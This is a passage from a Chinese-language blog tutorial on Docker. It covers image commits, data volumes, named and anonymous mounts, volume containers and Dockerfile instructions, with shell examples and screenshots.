class="line"></span><br><span class="line">删除&#96;docs&#96;容器文档，再次访问8888页面，然后刷新</span><br><span class="line"></span><br><span class="line">![image-20200509221117054](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509221117054.png)</span><br><span class="line"></span><br><span class="line">访问8888之后就返回404因为你将容器文档删除了</span><br><span class="line"></span><br><span class="line">![image-20200509221245167](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509221245167.png)</span><br><span class="line"></span><br><span class="line">- 也即当前的tomcat运行实例是一个没有文档内容的容器，以它为模板commit一个没有doc的tomcat新镜像atguigu&#x2F;tomcat02</span><br><span class="line"></span><br><span class="line">  - 使用&#96;docker commit -a&#x3D;&quot;long&quot; -m&#x3D;&quot;del tomcat docs&quot; 2d73f0856d17 long&#x2F;tomcat02:1.2&#96;</span><br><span class="line"></span><br><span class="line">  ![image-20200509222553460](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509222553460.png)</span><br><span class="line"></span><br><span class="line">  访问之后并没有找到</span><br><span class="line"></span><br><span class="line">  ![image-20200509223418689](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509223418689.png)</span><br><span class="line"></span><br><span class="line">  直接拉取 tomcat</span><br><span class="line"></span><br><span class="line">  ![image-20200509223555485](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509223555485.png)</span><br><span class="line"></span><br><span class="line">  访问7788地址，成功访问了，这个是默认的并不是我们新建的</span><br><span class="line"></span><br><span class="line">  ![image-20200509223621247](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509223621247.png)</span><br><span class="line"></span><br><span class="line">- 启动我们的新镜像并和原来的对比</span><br><span class="line"></span><br><span class="line">  - 启动&#96;long&#x2F;tomcat02&#96;，它没有docs</span><br><span class="line">  - 启动原来的tomcat，它有docs</span><br><span class="line"></span><br><span class="line">**补充：**使用&#96;docker run -d -p 6666:8080 tomcat&#96;，后台的方式启动，它并没有在前台返回日志。</span><br><span class="line"></span><br><span class="line">![image-20200509224259556](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509224259556.png)</span><br><span class="line"></span><br><span class="line">在页面中访问6666端口依旧可以访问</span><br><span class="line"></span><br><span class="line">![image-20200509224419848](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509224419848.png)</span><br><span class="line"></span><br><span class="line">#### Docker容器数据卷</span><br><span class="line"></span><br><span class="line">使用Docker时，通常需要保存数据，或者在多个容器之间共享数据，这就涉及Docker 容器的数据操作。目前主要有两种方法可以管理容器中的数据:数据卷和数据卷容器。 </span><br><span class="line"></span><br><span class="line">数据卷(Data Volume)：将容器中的数据直接映射到本地宿主机。</span><br><span class="line"></span><br><span class="line">数据卷容器(Data Volume Container):使用特定容器维护数据卷。 </span><br><span class="line"></span><br><span class="line">##### 数据卷</span><br><span class="line"></span><br><span class="line">Docker的镜像是一系列只读层的组合，启动一个容器时，Docker加载镜像的所有只读 层，并向顶层添加读写层。这种设计提高了 Docker构建、存储和分发镜像的效率，节省了时 间和存储空间，但也存在以下问题。 </span><br><span class="line"></span><br><span class="line">- 容器中的文件以复杂的形式存储在宿主机上，在宿主机上不便于访问容器中的 文件。 </span><br><span class="line">- 多个容器之间的数据无法共享。 </span><br><span class="line">- 容器被删除，其产生的数据将丢失。 </span><br><span class="line"></span><br><span class="line">为了解决Docker在架构设计上的问题，引入了数据卷机制。数据卷可用于存储Docker 应用的数据以及Docker容器之间共享的数据。简单来说，数据卷的存在非常简单,可以绕 过默认的联合文件系统而以正常的文件或者目录的形式存在于宿主机中，即使被修改也不 会影响镜像。</span><br><span class="line"></span><br><span class="line">##### 使用Docker的数据卷可以实现以下功能。</span><br><span class="line"></span><br><span class="line">- 在容器启动时，数据卷被初始化;当容器使用的镜像在挂载点存在数据，则数据会被 拷贝到初始化后的数据卷中。 </span><br><span class="line">- 在不同的容器之间,数据卷可以被共享和重用。 </span><br><span class="line">- 数据卷可以在宿主和容器之间共享数据。 </span><br><span class="line">- 数据卷中的数据可在宿主机或容器内直接修改，修改完成后立即生效。 </span><br><span class="line">- 数据卷是持续性的，即使数据卷容器被删除,只要还有一个容器在使用该数据卷，数 据就不会被删除。 </span><br><span class="line">- 数据卷可以持久化数据，容器运行期间产生的数据并不会保存到镜像中，重新用此 镜像启动新的容器就会初始化镜像，会加一个全新的读写层来保存数据。</span><br><span class="line"></span><br><span class="line">Docker理念</span><br><span class="line"></span><br><span class="line">- 将运用与运行的环境打包形成容器运行，运行可以伴随着容器，但是我们对数据的要求希望是持久化的</span><br><span class="line">- 容器之间希望有可能共享数据</span><br><span class="line"></span><br><span class="line">![image-20200511205222360](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200511205222360.png)</span><br><span class="line"></span><br><span class="line">##### 使用数据卷</span><br><span class="line"></span><br><span class="line">&gt;方式一：直接使用命令来挂载 -v</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;shell</span><br><span class="line"># -v 就好比 -p 的端口映射</span><br><span class="line">docker run -it -v 主机目录:容器内目录</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 测试</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 1、在home目录下做测试，先查看home目录下有没有东西</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/docker/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710101218417.png" alt="image-20200710101218417"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 2、使用以下命令，并进入容器的home文件查看里面内容</span></span><br><span class="line">docker run -it -v /home/test:/home centos /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710101442957.png" alt="image-20200710101442957"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 3、发现没有内容，打开一个新的窗口，查看本机的home文件下是否有内容</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 可以看到本地的home文件下已经生成了<span class="built_in">test</span>文件，<span class="built_in">test</span>文件中没有内容</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710101726407.png" alt="image-20200710101726407"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在容器中的home文件下随便进行操作，这里就创建个文件，查看本地home/<span class="built_in">test</span>下时候也同样的出现了改文件</span></span><br></pre></td></tr></table></figure>

<p><strong>容器</strong><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710101924190.png" alt="image-20200710101924190"></p>
<p><strong>本地</strong><img src="/2020/07/25/docker/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710101956528.png" alt="image-20200710101956528"></p>
<p><strong>他是一个双向的，如果在本地修改文件，容器中也会进行同样的修改</strong></p>
<h4 id="实战：MySQL"><a href="#实战：MySQL" class="headerlink" title="实战：MySQL"></a>实战：MySQL</h4><p>思考：mysql的数据持久化问题</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取镜像</span></span><br><span class="line">docker pull mysql:5.7</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行镜像，进行数据挂载~  <span class="comment"># 安装启动mysql，需要配置密码</span></span></span><br><span class="line">docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 参数</span></span><br><span class="line">-d：后台运行</span><br><span class="line">-p：端口映射</span><br><span class="line">-v：数据卷挂载</span><br><span class="line">-e：环境配置</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 官方测试 </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -e 后面的MYSQL_ROOT_PASSWORD=密码    <span class="comment"># 这个就是设置mysql的密码</span></span></span><br><span class="line">docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动成功后，我们在本地使用sqlyog来进行测试</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sqlyog 连接到服务器的3310 --- 3310和容器内的3306映射</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在本地测试创建一个数据库，查看一下我们的映射路径是否成功</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710132456410.png" alt="image-20200710132456410"></p>
<p>假设将我们的容器删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710133139212.png" alt="image-20200710133139212"></p>
<p>发现我们挂载到本地的数据卷依旧没有丢失，这就实现了容器数据持久化功能！</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710133051813.png" alt="image-20200710133051813"></p>
<h4 id="具名和匿名挂载"><a href="#具名和匿名挂载" class="headerlink" title="具名和匿名挂载"></a>具名和匿名挂载</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 匿名挂载</span></span><br><span class="line">-v 容器内路径！</span><br><span class="line">docker run -d -P --name nginx01 -v /etc/nginx nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看所有的 volume 的情况</span></span><br><span class="line">docker volume ls</span><br><span class="line">DRIVER              VOLUME NAME</span><br><span class="line">local               358d04b6ef70c3c3c33abd7828ed32cffd78a445f402add1351cb20c8203594f</span><br><span class="line">local               c816c5026889b5ebfe1966c3658558348fbeed4aae4af1bb8a31d5714f916328</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里发现，这种就是匿名挂载，我们在 -v 只写了容器内的路径，没有写容器外的路径</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/docker/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710140053130.png" alt="image-20200710140053130"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 具名挂载</span></span><br><span class="line">docker run -d -P --name nginx02 -v long-nginx:/ect/nginx nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看 volume 情况</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home# docker volume ls</span><br><span class="line">DRIVER              VOLUME NAME</span><br><span class="line">local               long-nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过 -v 卷名:容器内路径		<span class="comment"># 卷名只是给他命名的名字</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看一下这个卷</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710141307021.png" alt="image-20200710141307021"></p>
<p>所有的docker容器内的卷，没有定制目录的情况下都是在<code>/var/lib/docker/volumes/xxx/_data</code>下面。</p>
<p>我们通过具名挂在可以方便的找 到我们的一个卷，大多数情况下在使用的<code>具名挂载</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 区分具名挂载和匿名挂载，还有指定挂载</span></span><br><span class="line">-v 容器内路径		# 匿名挂载</span><br><span class="line">-v 卷名:容器内路径		# 具名挂载</span><br><span class="line">-v /宿主机路径:容器内路径		# 指定挂载</span><br></pre></td></tr></table></figure>

<p>扩展：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 通过 -v 容器内路径：ro、rw 改变读写权限</span></span><br><span class="line">ro	readonly	# 只读</span><br><span class="line">rw	readwrite	# 可读可写</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一旦设定了容器权限，容器对我们挂载出来的内容就有限定了</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home# docker run -d -P --name nginx02 -v long-nginx:/etc/nginx:ro nginx</span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home# docker run -d -P --name nginx02 -v long-nginx:/etc/nginx:rw nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ro 只要看到ro就说明这个路径只能通过宿主机来操作，容器内部是无法操作</span></span><br></pre></td></tr></table></figure>

<h4 id="初识DockerFile"><a href="#初识DockerFile" class="headerlink" title="初识DockerFile"></a>初识DockerFile</h4><p>dockerfile就是用来构建docker 镜像的构建文件！命令脚本！</p>
<p>通过这个脚本可以生成镜像，镜像是一层一层的，脚本就是一个一个的命令，每个命令都是一层！</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建一个dockerfile文件，名字可以随机 建议 Dockerfile</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件中内容 指令（大写） 参数</span></span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">VOLUME ["volume01","volume02"]</span><br><span class="line"></span><br><span class="line">CMD echo "----end----"</span><br><span class="line"></span><br><span class="line">CMD /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里的每一个命令，就是镜像的一层</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710164902856.png" alt="image-20200710164902856"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动自己写的容器</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710173957881.png" alt="image-20200710173957881"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710173710647.png" alt="image-20200710173710647"></p>
<p>这个卷和外部一定有一个同步的目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710170549879.png" alt="image-20200710170549879"></p>
<p>进入我们的刚才自动生成的数据卷目录，新建一个文件</p>
<p>可以看到这个centos是个阉割版的clear都用不了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710174153216.png" alt="image-20200710174153216"></p>
<p>新建一个新的窗口，查看一下容器信息</p>
<p>正在运行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710174437653.png" alt="image-20200710174437653"></p>
<p>查看一下匿名挂载的路径</p>
<p><code>docker inspect 容器ID</code></p>
<p>找到Mounts，找到之前创建文件的volume01路径</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710175231742.png" alt="image-20200710175231742"></p>
<p>复制进入，ls查看，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710175251710.png" alt="image-20200710175251710"></p>
<p>这种方法我们是非常常用的，因为我们通常要构造自己的镜像！</p>
<p>假设构建镜像时没有挂载卷，需要手动挂载 -v 卷名:容器内路径</p>
<h4 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h4><p>多个mysql同步数据</p>
<p>有一个子容器centos02和一个父容器centos01，我们需要要一个容器去挂载父容器，实现数据同步，所以需要centos02跟01实现一个挂载，所以要是用一个命令 <code>--volumes-from</code>通过这个方式就可以跟centos01数据同步上了。</p>
<p>谁去挂载谁称之为父容器，如果centos02一旦挂载了centos01，那么它们两个同步的数据卷内容就是同步的。而被挂载的所谓的父容器，他就叫做<strong>数据卷容器</strong>他有一个容器，但是他有一个挂载的功能，我们可以通过数据卷容器给其他人共享一些内容，或者<strong>两个容器/多个容器</strong>之间实行容器的共享</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711203957148.png" alt="image-20200711203957148"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动3个容器，通过我们刚才自己写的镜像启动</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711211315036.png" alt="image-20200711211315036"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用该命令将数据卷02挂载到数据卷01实现数据同步</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker run -it --name docker02 --volumes-from docker01 long/centos:1.0</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711212739664.png" alt="image-20200711212739664"></p>
<p>新建一个窗口分别进入容器1和容器2，查看当前地址下的目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711212904189.png" alt="image-20200711212904189"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711212938049.png" alt="image-20200711212938049"></p>
<p>在容器1进入volume01，在里面新建一个文件，查看容器2的volume01是否也有该文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711213032498.png" alt="image-20200711213032498"></p>
<p>这样成功地返回了容器1中新建的内容，当然如果在创建一个容器3都是一个道理</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711213056453.png" alt="image-20200711213056453"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 删除docker01，查看docker02和03发现还可以访问这个文件</span></span><br></pre></td></tr></table></figure>

<p>这是一种备份机制而不是共享机制，他这里面的概念是拷贝的概念，双向拷贝的概念。</p>
<p>如果将容器1删除了，但是容器2和3已经将里面的共享卷拷贝出来了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711215345468.png" alt="image-20200711215345468"></p>
<p>多个mysql同步数据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~#	docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br><span class="line"></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~#	docker run -d -p 3310:3306 -v -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 --volumes-from mysql01 mysql:5.7</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这个时候可以实现两个容器数据同步</span></span><br></pre></td></tr></table></figure>

<p><strong>结论</strong>：</p>
<p>容器之间可以做一些配置信息的传递，数据卷容器的生命周期一只持续到没有容器使用为之。</p>
<p>但是一旦持久化了本地，这个时候，本地的数据是不会删除的</p>
<h4 id="DockerFile介绍"><a href="#DockerFile介绍" class="headerlink" title="DockerFile介绍"></a>DockerFile介绍</h4><p>dockerfile是用来构建docker镜像的文件！命令参数脚本！</p>
<p><strong>构建步骤：</strong></p>
<p>1、编写一个  dockerfile 文件</p>
<p>2、docker build    构建称为一个镜像</p>
<p>3、docker run 运行镜像</p>
<p>4、docker push 发布镜像（DockerHub、阿里云镜像仓库）</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712200018691.png" alt="image-20200712200018691"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712200244969.png" alt="image-20200712200244969"></p>
<p>很多官方镜像都是基础包，很多功能没有，我们通常会自己搭建自己的镜像！    因为每个人的需求不同，比如我们要加 jdk + tomcat + Mysql + reid。</p>
<p>既然官方可以制作镜像，那么我们也可以</p>
<h4 id="DockerFile构建过程"><a href="#DockerFile构建过程" class="headerlink" title="DockerFile构建过程"></a>DockerFile构建过程</h4><h5 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h5><p>1、每个保留关键字（指令）都是必须是大写字母</p>
<p>2、执行从上到下顺序执行</p>
<p>3、# 表示注释</p>
<p>4、每一个指令都会创建提交一个新的镜像层，并提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712203820415.png" alt="image-20200712203820415"></p>
<p>dockerfile是面向开发的，我们以后要发布项目，做镜像，就需要编写dockerfile文件，这个文件十分简单！</p>
<p>Docker镜像逐渐成为企业交付的标准，必须要掌握！</p>
<p><strong>步骤：</strong></p>
<p>Dockerfile：构建稳健，定义了一切的步骤，源代码</p>
<p>DockerImages：通过DockerFile构建生成的镜像，最终发布和运行的产品</p>
<p>Docker容器：容器就是镜像运行起来提供服务器</p>
<h4 id="DockerFile的指令"><a href="#DockerFile的指令" class="headerlink" title="DockerFile的指令"></a>DockerFile的指令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM				# 基础镜像，一切从这里开始构建 centos</span><br><span class="line">MAINTAINER			# 镜像是谁写的，姓名 + 邮箱</span><br><span class="line">RUN					# 镜像构建的时候需要运行的命令</span><br><span class="line">ADD					# 步骤，tomcat镜像，这个tomcat！ 添加内容</span><br><span class="line">WORKDIR				# 镜像的工作目录</span><br><span class="line">VOLUME				# 挂载的目录位置</span><br><span class="line">EXPOSE				# 指定暴露端口</span><br><span class="line">CMD					# 指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代</span><br><span class="line">ENTRYPOINT			# 指定这个容器启动的时候要运行的命令，可以追加命令</span><br><span class="line">ONBUILD				# 当构建一个被继承 DockerFile 这个时候就会运行 ONBUILD 的指令，触发指令</span><br><span class="line">COPY				# 类似ADD，将我们文件拷贝到镜像中</span><br><span class="line">ENV					# 构建的时候设置环境变量</span><br></pre></td></tr></table></figure>

<p>CMD命令和ENTRYPOINT的区别。</p>
<p>例如：在CMD中构造了 ls -a，然后docker run执行了容器，在容器外使用ls -l或者-l的话就会将容器内的 -a替换掉，如果是ENTRYPOINT的话就会在后面追加，ls -a -l 这样。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712205623510.png" alt="image-20200712205623510"></p>
<h5 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h5><p>docker hub 中99%的镜像都是从FROM scratch开始的，然后配置需要的软件和配置来进行构建。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712211723345.png" alt="image-20200712211723345"></p>
<blockquote>
<p>创建一个自己的centos</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1、编写dockerfile的文件</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# cat mycentos </span><br><span class="line"></span><br><span class="line">FROM centos</span><br><span class="line">MAINTAINER long&lt;1927353788@qq.ocm&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line"></span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD echo $MYPATH</span><br><span class="line">CMD echo "----end----"</span><br><span class="line">CMD /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2、通过这个文件构建镜像</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 命令： docker build -f dockerfile的文件路径 -t 镜像名:版本号 .</span></span><br><span class="line">成功返回</span><br><span class="line">Successfully built 789e8d69df33</span><br><span class="line">Successfully tagged mydocker:1.0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3、测试运行</span></span><br></pre></td></tr></table></figure>

<p>对比：之前原来的centos</p>
<p>pwd</p>
<p>原centos的工作目录是根目录：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712214252421.png" alt="image-20200712214252421"></p>
<p>自己构建的centos我们设置的根目录是/usr/local：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712214315005.png" alt="image-20200712214315005"></p>
<p>vim</p>
<p>原centos中的vim命令不能使用：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712214359447.png" alt="image-20200712214359447"></p>
<p>自己构建的centos的vim命令可以使用：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712214508762.png" alt="image-20200712214508762"></p>
<p>ifconfig</p>
<p>原centos的ifconfig命令不能使用：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712214548323.png" alt="image-20200712214548323"></p>
<p>自己构建的centos的ifconfig命令可以使用：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712214651098.png" alt="image-20200712214651098"></p>
<p>我们可以列出本地本地进行的变更历史</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker history 容器ID</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712215508982.png" alt="image-20200712215508982"></p>
<blockquote>
<p>CMD和 ENTRYPOINT的区别</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CMD					# 指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代</span><br><span class="line">ENTRYPOINT			# 指定这个容器启动的时候要运行的命令，可以追加命令</span><br></pre></td></tr></table></figure>

<p>测试CMD</p>
